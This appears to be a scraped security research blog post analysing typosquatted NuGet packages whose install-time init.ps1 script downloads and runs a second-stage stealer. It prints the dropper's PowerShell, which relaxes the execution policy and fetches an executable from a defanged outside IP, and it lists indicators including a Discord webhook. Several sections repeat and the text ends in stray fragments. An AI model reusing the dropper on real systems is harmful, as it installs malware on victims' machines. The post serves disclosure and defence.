@@ -1,0 +1,258 @@
+
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214343_870412\liciousPackages863x3001.png
+
+Update 2023-03-21 – We’ve talked with members of the NuGet team and they had already detected and removed the malicious packages in question.
+Malicious packages are often spread by the open source NPM and PyPI package repositories, with few other repositories affected. Specifically – there was no public evidence of severe malicious activity in the NuGet repository other than spam packages used for spreading phishing links. As with other repositories, the JFrog Security Research team regularly monitors the NuGet repository for malicious packages, including manual analysis of suspicious code.
+With this in mind, the security research team recently identified a sophisticated and highly-malicious attack targeting .NET developers via the NuGet repository, using sophisticated typosquatting techniques. The discovered packages – which were downloaded 150K times over the past month (before they were removed from the NuGet repository) – contained a “download & execute” type of payload. The packages contained a PowerShell script that would execute upon installation and trigger a download of a “2nd stage” payload, which could be remotely executed. The 2nd stage payload is a custom, more sophisticated executable which will be briefly explained in this post, and will be thoroughly analyzed in our next blog post.
+NuGet is still ripe for malicious package attacks
+Despite the fact that the discovered malicious packages have since been removed from NuGet, .NET developers are still at high risk from malicious code, since NuGet packages still contain facilities to run code immediately upon package installation.
+In old Visual Studio versions a developer could place a PowerShell script inside the tools directory of a NuGet package, and the script would automatically be run with no constraints on specific events – Package installation, uninstallation, on VS startup, etc.
+Currently, it seems that Microsoft is pushing developers to leave this option behind, as the install.ps1 and uninstall.ps1 run-on-install scripts are ignored. In the current documentation, these scripts are not mentioned, except in some side notes.
+However, although it is deprecated – the init.ps1 script is still honored by Visual Studio, and will run without any warning when installing a NuGet package (It is important to note the init script automatic execution won’t occur while using the NuGet CLI).  Additionally,  the script will re-run each time the project’s solution is opened with Package Manager Console window:
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214343_870412\1_Creatingasolutionwithtoolsinit_ps1fileinside.png
+Creating a solution with tools/init.ps1 file inside
+Inside the .ps1 file, an attacker can write arbitrary commands. For example:
+& {[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); 
+[System.Windows.Forms.MessageBox]::Show('Hello From init','WARNING')}
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214343_870412\2_TestInstallScript_Lib.png
+
+After installing the package (without executing anything explicitly) we can see that the “malicious” command ran immediately – meaning the PowerShell script successfully executed without confirmation or warning.
+Moreover, even if the init.ps1 script is not referred to by the .nuspec metadata file, it will still be executed!
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214343_870412\3_The_nuspecMetadataFilenomentionofinit_ps1.png
+The .nuspec Metadata File (no mention of init.ps1)
+These kinds of autorun mechanisms are a big reason why we can find thousands of malicious packages plaguing the NPM and PyPI ecosystems as compared to the Go package ecosystem, for example, in which the client will not cause code to automatically run when a module is installed. The attacker’s code is much more likely to run if only package installation is needed to trigger it.
+Which malicious packages were discovered?
+We determined the following NuGet packages contained the same malicious payload –
+
+
+
+Coinbase.Core	BinanceOfficial	121.9K	2023-02-22	Coinbase
+Anarchy.Wrapper.Net	OfficialDevelopmentTeam	30.4K	2023-02-21	Anarchy-Wrapper
+DiscordRichPresence.API	OfficialDevelopmentTeam	14.1K	2023-02-21	DiscordRichPresence
+Avalon-Net-Core	joeIverhagen	1.2k	2023-01-03	AvalonEdit
+Manage.Carasel.Net	OfficialDevelopmentTeam	559	2023-02-21	N/A
+Asip.Net.Core	BinanceOfficial	246	2023-02-22	Microsoft.AspNetCore
+Sys.Forms.26	joeIverhagen	205	2023-01-03	System.Windows.Forms
+Azetap.API	DevNuget	153	2023-02-27	N/A
+AvalonNetCore	RahulMohammad	67	2023-01-04	AvalonEdit
+Json.Manager.Core	BestDeveIopers	46	2023-03-12	Generic .NET name
+Managed.Windows.Core	MahamadRohu	37	2023-01-05	Generic .NET name
+Nexzor.Graphical.Designer.Core	Impala	36	2023-03-12	N/A
+Azeta.API	Soubata	28	2023-02-24	N/A
+The top three packages were downloaded an incredible amount of times – this could be an indicator that the attack was highly successful, infecting a large amount of machines.  However, this is not a fully reliable indicator of the attack’s success since the attackers could have automatically inflated the download count (with bots) to make the packages seem more legitimate.
+Indicators for malicious activity
+The main malicious indicator in the above packages, is the init.ps1 script which will execute upon installation and immediately download an .EXE binary and execute it on the victim’s workstation –
+New-ItemProperty -Path 'HKCU:Software\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell' 
+-Name 'ExecutionPolicy' -Value "Unrestricted" -PropertyType String -Force Clear-Host 
+$ProcName = "Impala.exe" $WebFile = "http://62[.]182[.]84[.]61/4563636/$ProcName"  
+(New-Object System.Net.WebClient).DownloadFile($WebFile,"$env:APPDATA\$ProcName") 
+Start-Process ("$env:APPDATA\$ProcName")
+This behavior is extremely rare outside of malicious packages, especially taking into consideration the “Unrestricted” execution policy, which should immediately trigger a red flag.
+In order to trick users to download the package the following methods were used:
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214343_870412\11_JoeIVerhagen.png
+
+“typosquatting” – A method for assigning names to the packages that are extremely similar to legitimate packages. For example “Coinbase.Core” which tries to mimic the popular, legitimate package “Coinbase”.
+
+
+
+Coinbase.Core’s page (malicious package)
+
+
+
+
+
+Coinbase’s page (legitimate package)
+
+
+
+ 
+The package owner names used terms which attempt to make the package appear more legitimate (BinanceOfficial, NuGetDev, OfficialDevelopmentTeam).
+
+
+
+
+As NuGet does not have a verification process for the “Author” attribute in the .nuspec metadata file, some packages had misleading metadata, such as “Microsoft” as the author, and a vague description.
+
+The “Author” field is indistinguishable when comparing to official packages
+
+
+
+
+
+Azetap.API package’s author defined as Microsoft with a false description
+
+
+
+ 
+Some packages did not contain any direct malicious payload. Instead, they defined other malicious packages as dependencies, which then contained the malicious script.
+
+
+
+The DiscordRichPresence.API package uses a malicious dependency. The malicious .ps1 payload is inside the “Manage.Carasel.Net” package.
+
+
+
+ 
+Some of the packages were published by authors who looked legitimate at first glance, for example the author name “joelverhagen”, which appears to be the account name of one of Microsoft’s software developers working on NuGet –
+
+
+
+
+
+However – under closer inspection it seems the attackers used the author name joeIverhagen (uppercase “i” instead of lowercase “l”) to masquerade as the legitimate account joelverhagen.
+
+“typosquatting” – A method for assigning names to the packages that are extremely similar to legitimate packages. For example “Coinbase.Core” which tries to mimic the popular, legitimate package “Coinbase”.
+
+
+
+Coinbase.Core’s page (malicious package)
+
+
+
+
+
+Coinbase’s page (legitimate package)
+The package owner names used terms which attempt to make the package appear more legitimate (BinanceOfficial, NuGetDev, OfficialDevelopmentTeam).
+As NuGet does not have a verification process for the “Author” attribute in the .nuspec metadata file, some packages had misleading metadata, such as “Microsoft” as the author, and a vague description.
+
+The “Author” field is indistinguishable when comparing to official packages
+
+
+
+
+
+Azetap.API package’s author defined as Microsoft with a false description
+Some packages did not contain any direct malicious payload. Instead, they defined other malicious packages as dependencies, which then contained the malicious script.
+
+
+
+The DiscordRichPresence.API package uses a malicious dependency. The malicious .ps1 payload is inside the “Manage.Carasel.Net” package.
+Some of the packages were published by authors who looked legitimate at first glance, for example the author name “joelverhagen”, which appears to be the account name of one of Microsoft’s software developers working on NuGet –
+
+
+
+
+
+However – under closer inspection it seems the attackers used the author name joeIverhagen (uppercase “i” instead of lowercase “l”) to masquerade as the legitimate account joelverhagen.
+The unusually sophisticated malicious payload
+Dropper script
+All of the observed malicious packages had the same payload script (either directly or as a dependency). First, the payload script would change PowerShell’s running configuration so the current user would be allowed to execute PowerShell scripts with no restrictions, using the following command:
+New-ItemProperty -Path 'HKCU:Software\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell' -Name 'ExecutionPolicy' 
+-Value "Unrestricted" -PropertyType String -Force
+The script then proceeds to download a Windows executable file from a remote server, using .NET’s WebClient class:
+$ProcName = "Avalon.exe"
+$wc = [System.Net.WebClient]::new()
+$wc.DownloadFile("http://62[.]182[.]84[.]61/$ProcName", "$env:APPDATA\$ProcName")
+$wc.Dispose()
+Finally, the payload script executes the downloaded binary (which we will refer to as the “2nd stage payload”), after clearing the script’s output from the screen:
+Clear-Host
+Start-Process ("$env:APPDATA\$ProcName")
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214343_870412\13_maninthemiddleattack.png
+It is also worth noting the download and execute payload used an HTTP (non-TLS) URL. This is especially dangerous since local network attackers who lack control of the original C2 domain, could potentially intercept the download request using a man-in-the-middle attack.  Doing so would allow them to change the payload arbitrarily to fit their needs and gain full control of the machine that installed the malicious NuGet package.
+We have published a full analysis of the malicious Impala Stealer payload here.
+2nd stage payload
+The vast majority of malicious package payloads discovered by the JFrog Security Research team are based on open-source hacking tools, since attackers are typically seeking the greatest ROI in the least amount of time and not requiring sophisticated code. However – in this case we observed a completely custom executable payload, written in a low-level language, indicating a more dedicated attacker.
+The information below is based on one of the 2nd stage payloads that we’ve observed, however – since the 2nd stage payload is downloaded dynamically from the C2 server, the attackers are able to switch the 2nd stage functionality at any time.
+Due to a leftover program database string (PDB), we can see the internal name for this payload is Impala –
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214343_870412\12_ImpalaPayload.png
+
+A partial analysis of the payload revealed it possesses the following capabilities:
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214343_870412\maxresdefault.jpg
+
+Crypto stealer – The payload references both the Exodus Lightning wallet app and has embedded Discord Webhooks, which may suggest the payload tries to exfiltrate crypto wallets via Discord webhooks.
+Electron Archive Extractor – The payload can extract and execute code from Electron archives, using an embedded compiled (Rustlang) copy of Rasar.
+Auto-updater – The payload drops a small updater executable to C:\Users\user\AppData\Local\Squirrel-2021\Updater.exe which checks the original C2 URL for an updated version of the malware.
+We intend to publish a full analysis of this malicious payload in our next blog post, so stay tuned!
+https[:]//discord[.]com/api/webhooks/1076330498026115102/MLkgrUiivlgAoFWyvkSpLsBE3DMaDZd9cxPK3k9XQPyh6dw55jktV6qfDgxbs5AaY7Py
+
+62[.]182[.]84[.]61
+
+194[.]233[.]93[.]50
+
+195[.]58[.]39[.]167
+
+https[:]//paste[.]bingner[.]com/paste/xden6/raw
+
+Squirrel-2021\Updater[.]exe
+How to watch out for malicious NuGet packages
+First and foremost, developers should pay attention to typos in imported and installed packages. As one can see, some of these packages try to mimic the names of legitimate well-known packages, hoping that a developer would accidentally install them in their project, or mention them as a dependency.
+Another way to avoid installing malicious packages is to manually verify they don’t contain any suspicious installation or initialization scripts. We recommend inspecting the packages before installing them via the NuGet Package Explorer, which is available on a package’s page on the right pane menu.
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214343_870412\14_ZEntityFrameworkClassic.png
+
+You should check the contents of the init.ps1, install.ps1 or uninstall.ps1 scripts under the tools directory, as such:
+
+Be on the lookout for scripts that download and execute resources from external sources. You can also perform this check by downloading the package and examining the files locally –
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214343_870412\16_downloadpackage.png
+
+When downloading the package locally, make sure not to accidentally execute a script or binary file before thoroughly verifying it.
+Moreover, there are some other useful indicators to a package’s legitimacy, such as a high download count AND having many versions over a large timespan.
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214343_870412\17_Newtonsoftpackagewithover3billiondownloads.png
+The Newtonsoft.Json package with over 3 billion downloads and many versions
+A relatively new package with a low download count may indicate the package should be suspected, although it is important to note that these metrics can be spoofed by more sophisticated attackers.
+Improved detection and remediation with JFrog Xray
+As a response to this incident, we have added the malicious NuGet packages to JFrog Xray, which will allow customers to detect them immediately. JFrog Xray’s database of regularly curated packages currently contains more than 150K malicious packages across all relevant ecosystems, and continually evolves based on the findings of the JFrog Security Research team.
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214343_870412\DetectionandremediationwithJFrogXray_CROP.png
+
+
+Conclusions
+The results of this study prove  that no open source software repository is safe forever. Even though no prior malicious-code attacks were observed in the NuGet repository, we were able to find evidence for at least one recent campaign using methods such as typosquatting to propagate malicious code. As with other repositories, safety measures should be taken at every step of the software development lifecycle to ensure the software supply chain remains secure.
+See the second blog post in this series for a deeper analysis of the malicious payload found in this attack campaign!
+Stay up-to-date with JFrog Security Research
+In addition to exposing new security vulnerabilities and threats, JFrog provides developers and security teams easy access to the latest relevant information for their software with automated security scanning by JFrog Xray including enhanced CVE metadata and remediation advice.
+Follow us for product updates including automated vulnerability and malicious code detection to defend against the latest emerging threats – in our research website, security research blog posts and on Twitter @JFrogSecurity.
+tools
+install.ps1
+uninstall.ps1
+init.ps1
+.ps1
+init.ps1
+.nuspec
+init.ps1
+
+“typosquatting” – A method for assigning names to the packages that are extremely similar to legitimate packages. For example “Coinbase.Core” which tries to mimic the popular, legitimate package “Coinbase”.
+
+
+
+Coinbase.Core’s page (malicious package)
+
+
+
+
+
+Coinbase’s page (legitimate package)
+The package owner names used terms which attempt to make the package appear more legitimate (BinanceOfficial, NuGetDev, OfficialDevelopmentTeam).
+As NuGet does not have a verification process for the “Author” attribute in the .nuspec metadata file, some packages had misleading metadata, such as “Microsoft” as the author, and a vague description.
+
+The “Author” field is indistinguishable when comparing to official packages
+
+
+
+
+
+Azetap.API package’s author defined as Microsoft with a false description
+Some packages did not contain any direct malicious payload. Instead, they defined other malicious packages as dependencies, which then contained the malicious script.
+
+
+
+The DiscordRichPresence.API package uses a malicious dependency. The malicious .ps1 payload is inside the “Manage.Carasel.Net” package.
+Some of the packages were published by authors who looked legitimate at first glance, for example the author name “joelverhagen”, which appears to be the account name of one of Microsoft’s software developers working on NuGet –
+
+
+
+
+
+However – under closer inspection it seems the attackers used the author name joeIverhagen (uppercase “i” instead of lowercase “l”) to masquerade as the legitimate account joelverhagen.
+
+
+
+.nuspec
+
+
+.ps1
+
+
+C:\Users\user\AppData\Local\Squirrel-2021\Updater.exe
+init.ps1
+install.ps1
+uninstall.ps1
+tools
